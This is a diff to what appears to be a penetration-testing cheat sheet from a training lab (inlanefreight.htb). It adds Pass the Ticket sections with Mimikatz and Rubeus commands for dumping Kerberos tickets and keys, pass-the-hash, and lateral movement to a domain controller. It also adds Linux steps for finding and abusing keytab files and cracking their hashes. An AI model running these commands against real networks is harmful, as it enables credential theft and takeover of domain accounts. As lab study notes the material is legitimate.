@@ -875,7 +875,128 @@ xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B /dyna
 ```
 
 ### Pass the Ticket - Windows
+#### Harvest Tickets - Windows
+##### Mimikatz - Export Tickets
+```
+mimikatz.exe
+privilege::debug
+sekurlsa::tickets /export
+```
+##### Mimikatz - Extract Kerberos Keys
+```
+mimikatz.exe
+privilege::debug
+sekurlsa::ekeys
+```
+##### Mimikatz - Pass the Key or OverPass the Hash
+```
+mimikatz.exe
+privilege::debug
+sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f
+```
+##### Mimikatz - Pass the Ticket
+```
+mimikatz.exe 
+privilege::debug
+kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"
+exit
+```
+##### Mimikatz Pass the Ticket for Lateral Movement
+```
+mimikatz.exe
+privilege::debug
+kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"
+exit
+powershell
+Enter-PSSession -ComputerName DC01
+```
+
+##### Rubeus - Export Tickets
+```
+rubeus.exe dump /nowrap
+```
+##### Ruberus Pass the Key or OverPass the Hash
+```
+Rubeus.exe  asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
+```
+##### Rubeus Pass the Ticket
+```
+Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
+Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
+```
+##### Convert .kirbi to Base64 and Pass the Ticket
+```
+[Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))
+Rubeus.exe ptt /ticket:output from preveious command
+```
+##### Rubeus - Powershell Remoting and Pass the Ticket
+```
+Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
+Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt
+powershell
+Enter-PSSession -ComputerName DC01
+```
+
 ### Pass the Ticket - Linux
+#### Identify Linux and AD Integration
+##### Realm
+```
+realm list
+```
+##### PS
+```
+ps -ef | grep -i "winbind\|sssd"
+```
+#### Find Keytab Files
+##### Find
+```
+find / -name *keytab* -ls 2>/dev/null
+```
+##### Cronjobs
+```
+crontab -l
+```
+##### Review Environment Variable
+```
+env | grep -i krb5
+```
+##### Search for Ccashe Files in /tmp
+```
+ls -la /tmp
+```
+##### Abusing KeyTab Files
+```
+klist -k -t 
+```
+##### Impersonating a User with a KeyTab
+```
+klist
+kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
+klist
+smbclient //dc01/carlos -k -c ls
+```
+##### Extracting Keytab Hashes with KeyTabExtract
+```
+python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab
+```
+##### Crack the hash with hashcat or crackstation
+```
+https://crackstation.net/
+```
+##### Log in as Carlos
+```
+su - carlos@inlanefreight.htb
+```
+##### Look for ccache Files
+```
+ls -la /tmp
+```
+##### Identifying Group Membership with id Comamnd
+```
+id julio@inlanefreight.htb
+```
+
+
 
 ## Cracking Files
 ### Protected Files
